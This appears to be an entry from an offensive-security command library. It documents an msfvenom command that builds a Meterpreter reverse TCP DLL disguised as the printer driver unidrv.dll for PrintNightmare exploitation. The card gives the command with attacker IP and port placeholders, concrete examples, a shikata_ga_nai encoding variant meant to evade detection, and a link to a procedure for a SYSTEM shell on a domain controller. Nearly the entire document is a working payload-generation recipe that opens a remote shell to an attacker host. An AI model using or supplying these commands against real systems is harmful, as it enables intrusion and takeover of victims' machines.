---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
name: msfvenom-generate-reverse-tcp-dll
type: command
executor: bash
data: >-
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$_ATTACKER_IP
  LPORT=$_ATTACKER_PORT -f dll -o unidrv.dll
output: null
created_at: '2023-04-06T03:56:02.903450+00:00'
updated_at: '2023-04-10T20:25:42.614659+00:00'
platforms:
  - Linux
  - Kali
tags:
  - payload-generation
  - metasploit
verified: true
validated: true
---

# msfvenom-generate-reverse-tcp-dll

## Command

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$_ATTACKER_IP LPORT=$_ATTACKER_PORT -f dll -o unidrv.dll
```

## Description

Generates a malicious DLL payload using msfvenom for use in PrintNightmare exploitation. The payload is a Meterpreter reverse TCP shell that connects back to the attacker when loaded by the spooler service.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| LHOST=$_ATTACKER_IP | Attacker's IP address for reverse connection | Yes |
| LPORT=$_ATTACKER_PORT | Listening port on attacker machine | Yes |
| -p windows/x64/meterpreter/reverse_tcp | Payload type (64-bit Windows Meterpreter reverse TCP) | Built-in |
| -f dll | Output format as DLL | Built-in |
| -o unidrv.dll | Output filename (mimics printer driver) | Yes |

## Examples

### Basic Usage

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll -o unidrv.dll
```

### Advanced Usage

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x64/shikata_ga_nai -i 3 -f dll -o unidrv.dll
```

## Expected Output

No console output beyond progress; generates unidrv.dll file. Success: File created with size indicating valid payload (e.g., 14336 bytes). Error if msfvenom not installed or invalid params.

## Related

- [[procedures/Exploit-PrintNightmare-for-DC-SYSTEM-Shell-via-Anonymous-SMB]]
